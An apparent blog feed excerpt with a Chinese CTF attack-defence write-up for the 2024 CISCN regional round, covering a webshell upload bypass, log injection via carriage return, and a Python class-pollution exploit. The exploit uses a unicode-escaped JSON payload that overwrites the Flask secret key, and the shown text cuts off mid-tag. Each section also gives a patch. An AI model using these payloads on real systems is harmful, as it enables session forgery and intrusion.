class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;开发与安全缺一不可，虽然不知道自己到底少学了多少基础，但是现在就先跟着&lt;a href=&quot;https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file&quot;&gt;Drun1baby的学习路线&lt;/a&gt;吧&lt;/p&gt;
&lt;p&gt;java第一步，先学SpringBoot，同时我这里也会稍微学一下Spring和SpringMVC&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1PE411i7CV&quot;&gt;https://www.bilibili.com/video/BV1PE411i7CV&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&quot;&gt;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/28/SpringBoot/image-20240628122350310.png&quot; alt=&quot;image-20240628122350310&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN华东南分区赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/</id>
    <published>2024-06-23T01:03:08.000Z</published>
    <updated>2024-07-01T16:58:06.089Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>⚠热异常⚠</p><p>办的很好，下次别在fjnu办了，切割了（（</p><p><del>现在是6月23号早上的8点36，星期天；24号，高等数学，（差）一章没看，27号，概率论，还行，还剩题没做…欸这茶歇东西还挺多ww</del></p><p>是web的wp</p><p>由我和@Laffey共同完成，个人对web的评价是纯拼积累，线下断网情况下有一个自己的本地博客太重要了，然后就是老赛棍魅力时刻（</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png" alt="image-20240623165857174"></p><span id="more"></span><hr><h1 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h1><p>ctrl+u</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623090909287.png" alt="image-20240623090909287"></p><hr><h1 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h1><h2 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h2><p>服务器不知道检查了什么东西，直接burp改后缀传马</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164803273.png" alt="image-20240623164803273"></p><h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164921584.png" alt="image-20240623164921584"></p><p>对文件后缀名作白名单处理，然后对文件内容的过滤多一个php文件开始标识符</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// $path = "./uploads";</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./uploads"</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"只允许png哦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$allow_content_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"myfile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$allow_content_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"只允许png哦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(&lt;\?|php|script|xml|user|htaccess)/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// echo "匹配成功!";</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'鼠鼠说你的内容不符合哦0-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Success!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Error!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="粗心的程序员"><a href="#粗心的程序员" class="headerlink" title="粗心的程序员"></a>粗心的程序员</h1><h2 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h2><p>扫目录发现有源码泄露。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165059136.png" alt="image-20240623165059136"></p><p>居然敢写日志在php文件里面。</p><p>只把换行符给过滤了(\n)，没过滤回车(\r)。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165123023.png" alt="image-20240623165123023"></p><p>然后访问一次home.php，再去config.php。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165150741.png" alt="image-20240623165150741"></p><h2 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h2><p>直接把写日志的操作删掉。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165240719.png" alt="image-20240623165240719"></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phperror_reporting(0);include &quot;default_info_auto_recovery.php&quot;;session_start();$username &#x3D; $_SESSION[&#39;username&#39;];$id &#x3D; $_SESSION[&#39;id&#39;];if ($username &amp;&amp; $id) &#123;echo &quot;Hello,&quot; . &quot;$username&quot;;&#125; else &#123;die(&quot;NO ACCESS&quot;);&#125;?&gt;&lt;br&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery-1.9.0.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery.base64.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;function submitData() &#123;var obj &#x3D; new Object();obj.name &#x3D; $(&#39;#newusername&#39;).val();var str &#x3D;$.base64.encode(JSON.stringify(obj.name).replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;\&quot;&quot;, &quot;&quot;));$.post(&quot;edit.php&quot;, &#123;newusername: str&#125;,function(str) &#123;alert(str);location.reload()&#125;);&#125;jQuery.base64 &#x3D; (function($) &#123;var keyStr &#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&quot;;function utf8Encode(string) &#123;string &#x3D; string.replace(&#x2F;\r\n&#x2F;g, &quot;\n&quot;);var utftext &#x3D; &quot;&quot;;for (var n &#x3D; 0; n &lt; string.length; n++) &#123;var c &#x3D; string.charCodeAt(n);if (c &lt; 128) &#123;utftext +&#x3D; String.fromCharCode(c);&#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 6) | 192);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125; else &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 12) | 224);utftext +&#x3D; String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125;&#125;return utftext;&#125;function encode(input) &#123;var output &#x3D; &quot;&quot;;var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i &#x3D; 0;input &#x3D; utf8Encode(input);while (i &lt; input.length) &#123;chr1 &#x3D; input.charCodeAt(i++);chr2 &#x3D; input.charCodeAt(i++);chr3 &#x3D; input.charCodeAt(i++);enc1 &#x3D; chr1 &gt;&gt; 2;enc2 &#x3D; ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);enc3 &#x3D; ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);enc4 &#x3D; chr3 &amp; 63;if (isNaN(chr2)) &#123;enc3 &#x3D; enc4 &#x3D; 64;&#125; else if (isNaN(chr3)) &#123;enc4 &#x3D; 64;&#125;output &#x3D; output +keyStr.charAt(enc1) + keyStr.charAt(enc2) +keyStr.charAt(enc3) + keyStr.charAt(enc4);&#125;return output;&#125;return &#123;encode: function(str) &#123;return encode(str);&#125;&#125;;&#125;(jQuery));&lt;&#x2F;script&gt;更改用户名&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;newusername&quot; id&#x3D;&quot;newusername&quot; value&#x3D;&quot;&quot;&gt;&lt;button type&#x3D;&quot;submit&quot; onclick&#x3D;&quot;submitData()&quot;&gt;更改&lt;&#x2F;button&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h1><h2 id="BREAK-2"><a href="#BREAK-2" class="headerlink" title="BREAK"></a>BREAK</h2><p>斩下二血</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原型链污染</p><p>过滤<code>&#39;init&#39;, &#39;global&#39;, &#39;env&#39;, &#39;app&#39;, &#39;_&#39;, &#39;string&#39;</code>，直接unicode绕过</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"secret\u005fkey"</span><span class="token operator">:</span><span class="token string">"114514"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就污染了，session本地生成一个：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"adminer"</span>session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"114514"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100402510.png" alt="image-20240623100402510"></p><p>然后带这个cookie去靶机</p><p><img 